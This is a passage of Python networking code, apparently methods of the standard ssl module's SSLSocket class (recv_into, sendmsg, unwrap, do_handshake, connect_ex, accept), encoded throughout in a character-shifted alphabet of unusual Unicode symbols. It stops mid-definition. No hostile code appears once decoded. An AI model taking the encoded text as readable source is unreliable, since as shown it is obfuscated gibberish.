ꚫ꛱꛷ꛬ꛲꛾ꛈꚻꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛎ꛷꛺꛾꛰ꛯꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛭ꜀꛱꛱꛰꛽ꚫꛬ꛹ꛯꚫꚳ꛹ꛭ꜄꛿꛰꛾ꚫ꛴꛾ꚫꛙ꛺꛹꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛹ꛭ꜄꛿꛰꛾ꚫꛈꚫ꛷꛰꛹ꚳꛭ꜀꛱꛱꛰꛽ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛴꛱ꚫ꛹ꛭ꜄꛿꛰꛾ꚫ꛴꛾ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛹ꛭ꜄꛿꛰꛾ꚫꛈꚫꚼꚻꚽꚿꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛱꛷ꛬ꛲꛾ꚫꚬꛈꚫꚻꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭ꛹꛺꛹ꚸ꜅꛰꛽꛺ꚫ꛱꛷ꛬ꛲꛾ꚫ꛹꛺꛿ꚫꛬ꛷꛷꛺꜂꛰ꛯꚫ꛴꛹ꚫꛮꛬ꛷꛷꛾ꚫ꛿꛺ꚫ꛽꛰ꛮ꜁ꛪ꛴꛹꛿꛺ꚳꚴꚫ꛺꛹ꚫꚰ꛾ꚭꚫꚰꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛪꛮ꛷ꛬ꛾꛾ꛪꛪꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹ꛽꛰ꛬꛯꚳ꛹ꛭ꜄꛿꛰꛾ꚷꚫꛭ꜀꛱꛱꛰꛽ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꜀꛻꛰꛽ꚳꚴꚹ꛽꛰ꛮ꜁ꛪ꛴꛹꛿꛺ꚳꛭ꜀꛱꛱꛰꛽ꚷꚫ꛹ꛭ꜄꛿꛰꛾ꚷꚫ꛱꛷ꛬ꛲꛾ꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛽꛰ꛮ꜁꛱꛽꛺꛸ꚳ꛾꛰꛷꛱ꚷꚫꛭ꜀꛱꛷꛰꛹ꛈꚼꚻꚽꚿꚷꚫ꛱꛷ꛬ꛲꛾ꛈꚻꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛎ꛷꛺꛾꛰ꛯꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭ꛽꛰ꛮ꜁꛱꛽꛺꛸ꚫ꛹꛺꛿ꚫꛬ꛷꛷꛺꜂꛰ꛯꚫ꛺꛹ꚫ꛴꛹꛾꛿ꛬ꛹ꛮ꛰꛾ꚫ꛺꛱ꚫꚰ꛾ꚭꚫꚰꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛪꛮ꛷ꛬ꛾꛾ꛪꛪꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꜀꛻꛰꛽ꚳꚴꚹ꛽꛰ꛮ꜁꛱꛽꛺꛸ꚳꛭ꜀꛱꛷꛰꛹ꚷꚫ꛱꛷ꛬ꛲꛾ꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛽꛰ꛮ꜁꛱꛽꛺꛸ꛪ꛴꛹꛿꛺ꚳ꛾꛰꛷꛱ꚷꚫꛭ꜀꛱꛱꛰꛽ꚷꚫ꛹ꛭ꜄꛿꛰꛾ꛈꛙ꛺꛹꛰ꚷꚫ꛱꛷ꛬ꛲꛾ꛈꚻꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛎ꛷꛺꛾꛰ꛯꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭ꛽꛰ꛮ꜁꛱꛽꛺꛸ꛪ꛴꛹꛿꛺ꚫ꛹꛺꛿ꚫꛬ꛷꛷꛺꜂꛰ꛯꚫ꛺꛹ꚫ꛴꛹꛾꛿ꛬ꛹ꛮ꛰꛾ꚫ꛺꛱ꚫꚰ꛾ꚭꚫꚰꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛪꛮ꛷ꛬ꛾꛾ꛪꛪꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꜀꛻꛰꛽ꚳꚴꚹ꛽꛰ꛮ꜁꛱꛽꛺꛸ꛪ꛴꛹꛿꛺ꚳꛭ꜀꛱꛱꛰꛽ꚷꚫ꛹ꛭ꜄꛿꛰꛾ꚷꚫ꛱꛷ꛬ꛲꛾ꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛽꛰ꛮ꜁꛸꛾꛲ꚳ꛾꛰꛷꛱ꚷꚫꚵꛬ꛽꛲꛾ꚷꚫꚵꚵ꛶꜂ꛬ꛽꛲꛾ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛙ꛺꛿ꛔ꛸꛻꛷꛰꛸꛰꛹꛿꛰ꛯꛐ꛽꛽꛺꛽ꚳꚭ꛽꛰ꛮ꜁꛸꛾꛲ꚫ꛹꛺꛿ꚫꛬ꛷꛷꛺꜂꛰ꛯꚫ꛺꛹ꚫ꛴꛹꛾꛿ꛬ꛹ꛮ꛰꛾ꚫ꛺꛱ꚫꚰ꛾ꚭꚫꚰꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛪꛮ꛷ꛬ꛾꛾ꛪꛪꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛽꛰ꛮ꜁꛸꛾꛲ꛪ꛴꛹꛿꛺ꚳ꛾꛰꛷꛱ꚷꚫꚵꛬ꛽꛲꛾ꚷꚫꚵꚵ꛶꜂ꛬ꛽꛲꛾ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛙ꛺꛿ꛔ꛸꛻꛷꛰꛸꛰꛹꛿꛰ꛯꛐ꛽꛽꛺꛽ꚳꚭ꛽꛰ꛮ꜁꛸꛾꛲ꛪ꛴꛹꛿꛺ꚫ꛹꛺꛿ꚫꛬ꛷꛷꛺꜂꛰ꛯꚫ꛺꛹ꚫ꛴꛹꛾꛿ꛬ꛹ꛮ꛰꛾ꚫ꛺꛱ꚫꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭꚰ꛾ꚭꚫꚰꚫ꛾꛰꛷꛱ꚹꛪꛪꛮ꛷ꛬ꛾꛾ꛪꛪꚴꚕꚕꚫꚫꚫꚫꛋꛪ꛾꛾꛷ꛮ꛺꛻꜄ꛯ꛺ꛮꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛻꛰꛹ꛯ꛴꛹꛲ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛎ꛷꛺꛾꛰ꛯꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꛻꛰꛹ꛯ꛴꛹꛲ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꚻꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛳꜀꛿ꛯ꛺꜂꛹ꚳ꛾꛰꛷꛱ꚷꚫ꛳꛺꜂ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛎ꛷꛺꛾꛰ꛯꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫꛈꚫꛙ꛺꛹꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꜀꛻꛰꛽ꚳꚴꚹ꛾꛳꜀꛿ꛯ꛺꜂꛹ꚳ꛳꛺꜂ꚴꚕꚕꚫꚫꚫꚫꛋꛪ꛾꛾꛷ꛮ꛺꛻꜄ꛯ꛺ꛮꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꜀꛹꜂꛽ꛬ꛻ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾ꚫꛈꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꛾꛳꜀꛿ꛯ꛺꜂꛹ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫꛈꚫꛙ꛺꛹꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭꛙ꛺ꚫꛞꛞꛗꚫ꜂꛽ꛬ꛻꛻꛰꛽ꚫꛬ꛽꛺꜀꛹ꛯꚫꚭꚫꚶꚫ꛾꛿꛽ꚳ꛾꛰꛷꛱ꚴꚴꚕꚕꚫꚫꚫꚫꛋꛪ꛾꛾꛷ꛮ꛺꛻꜄ꛯ꛺ꛮꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꜁꛰꛽꛴꛱꜄ꛪꛮ꛷꛴꛰꛹꛿ꛪ꛻꛺꛾꛿ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꜁꛰꛽꛴꛱꜄ꛪꛮ꛷꛴꛰꛹꛿ꛪ꛻꛺꛾꛿ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭꛙ꛺ꚫꛞꛞꛗꚫ꜂꛽ꛬ꛻꛻꛰꛽ꚫꛬ꛽꛺꜀꛹ꛯꚫꚭꚫꚶꚫ꛾꛿꛽ꚳ꛾꛰꛷꛱ꚴꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛪ꛽꛰ꛬ꛷ꛪꛮ꛷꛺꛾꛰ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫꛈꚫꛙ꛺꛹꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꜀꛻꛰꛽ꚳꚴꚹꛪ꛽꛰ꛬ꛷ꛪꛮ꛷꛺꛾꛰ꚳꚴꚕꚕꚫꚫꚫꚫꛋꛪ꛾꛾꛷ꛮ꛺꛻꜄ꛯ꛺ꛮꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛯ꛺ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꚳ꛾꛰꛷꛱ꚷꚫꛭ꛷꛺ꛮ꛶ꛈꛑꛬ꛷꛾꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛪꛮ꛺꛹꛹꛰ꛮ꛿꛰ꛯꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛴꛸꛰꛺꜀꛿ꚫꛈꚫ꛾꛰꛷꛱ꚹ꛲꛰꛿꛿꛴꛸꛰꛺꜀꛿ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛿꛴꛸꛰꛺꜀꛿ꚫꛈꛈꚫꚻꚹꚻꚫꛬ꛹ꛯꚫꛭ꛷꛺ꛮ꛶ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹ꛾꛰꛿꛿꛴꛸꛰꛺꜀꛿ꚳꛙ꛺꛹꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹꛯ꛺ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛱꛴꛹ꛬ꛷꛷꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹ꛾꛰꛿꛿꛴꛸꛰꛺꜀꛿ꚳ꛿꛴꛸꛰꛺꜀꛿ꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛪ꛽꛰ꛬ꛷ꛪꛮ꛺꛹꛹꛰ꛮ꛿ꚳ꛾꛰꛷꛱ꚷꚫꛬꛯꛯ꛽ꚷꚫꛮ꛺꛹꛹꛰ꛮ꛿ꛪ꛰꜃ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹ꛾꛰꛽꜁꛰꛽ꛪ꛾꛴ꛯ꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭꛮꛬ꛹ꚲ꛿ꚫꛮ꛺꛹꛹꛰ꛮ꛿ꚫ꛴꛹ꚫ꛾꛰꛽꜁꛰꛽ꚸ꛾꛴ꛯ꛰ꚫ꛸꛺ꛯ꛰ꚭꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛓ꛰꛽꛰ꚫ꜂꛰ꚫꛬ꛾꛾꜀꛸꛰ꚫ꛿꛳ꛬ꛿ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛴꛾ꚫꛮ꛷꛴꛰꛹꛿ꚸ꛾꛴ꛯ꛰ꚷꚫꛬ꛹ꛯꚫ꛹꛺꛿ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛮ꛺꛹꛹꛰ꛮ꛿꛰ꛯꚫꛬ꛿ꚫ꛿꛳꛰ꚫ꛿꛴꛸꛰ꚫ꛺꛱ꚫ꛿꛳꛰ꚫꛮꛬ꛷꛷ꚹꚫꚫꛢ꛰ꚫꛮ꛺꛹꛹꛰ꛮ꛿ꚫ꛴꛿ꚷꚫ꛿꛳꛰꛹ꚫ꜂꛽ꛬ꛻ꚫ꛴꛿ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪꛮ꛺꛹꛹꛰ꛮ꛿꛰ꛯꚫ꛺꛽ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭꛬ꛿꛿꛰꛸꛻꛿ꚫ꛿꛺ꚫꛮ꛺꛹꛹꛰ꛮ꛿ꚫꛬ꛷꛽꛰ꛬꛯ꜄ꚸꛮ꛺꛹꛹꛰ꛮ꛿꛰ꛯꚫꛞꛞꛗꛞ꛺ꛮ꛶꛰꛿ꚬꚭꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫꛈꚫ꛾꛰꛷꛱ꚹꛮ꛺꛹꛿꛰꜃꛿ꚹꛪ꜂꛽ꛬ꛻ꛪ꛾꛺ꛮ꛶꛰꛿ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚷꚫꛑꛬ꛷꛾꛰ꚷꚫ꛾꛰꛷꛱ꚹ꛾꛰꛽꜁꛰꛽ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛺꜂꛹꛰꛽ꛈ꛾꛰꛷꛱ꚷꚫ꛾꛰꛾꛾꛴꛺꛹ꛈ꛾꛰꛷꛱ꚹꛪ꛾꛰꛾꛾꛴꛺꛹ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛮ꛺꛹꛹꛰ꛮ꛿ꛪ꛰꜃ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛮꚫꛈꚫ꛾꜀꛻꛰꛽ꚳꚴꚹꛮ꛺꛹꛹꛰ꛮ꛿ꛪ꛰꜃ꚳꛬꛯꛯ꛽ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛮꚫꛈꚫꛙ꛺꛹꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꜀꛻꛰꛽ꚳꚴꚹꛮ꛺꛹꛹꛰ꛮ꛿ꚳꛬꛯꛯ꛽ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫ꛽ꛮꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛺꛹꛹꛰ꛮ꛿꛰ꛯꚫꛈꚫꛟ꛽꜀꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛯ꛺ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꛪ꛺꛹ꛪꛮ꛺꛹꛹꛰ꛮ꛿ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛯ꛺ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛽ꛮꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꚳꛚꛞꛐ꛽꛽꛺꛽ꚷꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫꛈꚫꛙ꛺꛹꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛮ꛺꛹꛹꛰ꛮ꛿ꚳ꛾꛰꛷꛱ꚷꚫꛬꛯꛯ꛽ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛎ꛺꛹꛹꛰ꛮ꛿꛾ꚫ꛿꛺ꚫ꛽꛰꛸꛺꛿꛰ꚫꛌꛏꛏꛝꚷꚫꛬ꛹ꛯꚫ꛿꛳꛰꛹ꚫ꜂꛽ꛬ꛻꛾ꚫ꛿꛳꛰ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚫ꛴꛹ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛬ꛹ꚫꛞꛞꛗꚫꛮ꛳ꛬ꛹꛹꛰꛷ꚹꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛽꛰ꛬ꛷ꛪꛮ꛺꛹꛹꛰ꛮ꛿ꚳꛬꛯꛯ꛽ꚷꚫꛑꛬ꛷꛾꛰ꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛮ꛺꛹꛹꛰ꛮ꛿ꛪ꛰꜃ꚳ꛾꛰꛷꛱ꚷꚫꛬꛯꛯ꛽ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛎ꛺꛹꛹꛰ꛮ꛿꛾ꚫ꛿꛺ꚫ꛽꛰꛸꛺꛿꛰ꚫꛌꛏꛏꛝꚷꚫꛬ꛹ꛯꚫ꛿꛳꛰꛹ꚫ꜂꛽ꛬ꛻꛾ꚫ꛿꛳꛰ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚫ꛴꛹ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛬ꛹ꚫꛞꛞꛗꚫꛮ꛳ꛬ꛹꛹꛰꛷ꚹꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛽꛰ꛬ꛷ꛪꛮ꛺꛹꛹꛰ꛮ꛿ꚳꛬꛯꛯ꛽ꚷꚫꛟ꛽꜀꛰ꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛬꛮꛮ꛰꛻꛿ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛌꛮꛮ꛰꛻꛿꛾ꚫꛬꚫ꛹꛰꜂ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚫ꛱꛽꛺꛸ꚫꛬꚫ꛽꛰꛸꛺꛿꛰ꚫꛮ꛷꛴꛰꛹꛿ꚷꚫꛬ꛹ꛯꚫ꛽꛰꛿꜀꛽꛹꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛬꚫ꛿꜀꛻꛷꛰ꚫꛮ꛺꛹꛿ꛬ꛴꛹꛴꛹꛲ꚫ꛿꛳ꛬ꛿ꚫ꛹꛰꜂ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚫ꜂꛽ꛬ꛻꛻꛰ꛯꚫ꜂꛴꛿꛳ꚫꛬꚫ꛾꛰꛽꜁꛰꛽ꚸ꛾꛴ꛯ꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛞꛞꛗꚫꛮ꛳ꛬ꛹꛹꛰꛷ꚷꚫꛬ꛹ꛯꚫ꛿꛳꛰ꚫꛬꛯꛯ꛽꛰꛾꛾ꚫ꛺꛱ꚫ꛿꛳꛰ꚫ꛽꛰꛸꛺꛿꛰ꚫꛮ꛷꛴꛰꛹꛿ꚹꚭꚭꚭꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛹꛰꜂꛾꛺ꛮ꛶ꚷꚫꛬꛯꛯ꛽ꚫꛈꚫ꛾꜀꛻꛰꛽ꚳꚴꚹꛬꛮꛮ꛰꛻꛿ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛹꛰꜂꛾꛺ꛮ꛶ꚫꛈꚫ꛾꛰꛷꛱ꚹꛮ꛺꛹꛿꛰꜃꛿ꚹ꜂꛽ꛬ꛻ꛪ꛾꛺ꛮ꛶꛰꛿ꚳ꛹꛰꜂꛾꛺ꛮ꛶ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛺ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꛪ꛺꛹ꛪꛮ꛺꛹꛹꛰ꛮ꛿ꛈ꛾꛰꛷꛱ꚹꛯ꛺ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꛪ꛺꛹ꛪꛮ꛺꛹꛹꛰ꛮ꛿ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꜀꛻꛻꛽꛰꛾꛾ꛪ꛽ꛬ꛲꛲꛰ꛯꛪ꛰꛺꛱꛾ꛈ꛾꛰꛷꛱ꚹ꛾꜀꛻꛻꛽꛰꛾꛾ꛪ꛽ꛬ꛲꛲꛰ꛯꛪ꛰꛺꛱꛾ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛽꜁꛰꛽ꛪ꛾꛴ꛯ꛰ꛈꛟ꛽꜀꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛹꛰꜂꛾꛺ꛮ꛶ꚷꚫꛬꛯꛯ꛽ꚕꚕꚫꚫꚫꚫꛋꛪ꛾꛾꛷ꛮ꛺꛻꜄ꛯ꛺ꛮꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛲꛰꛿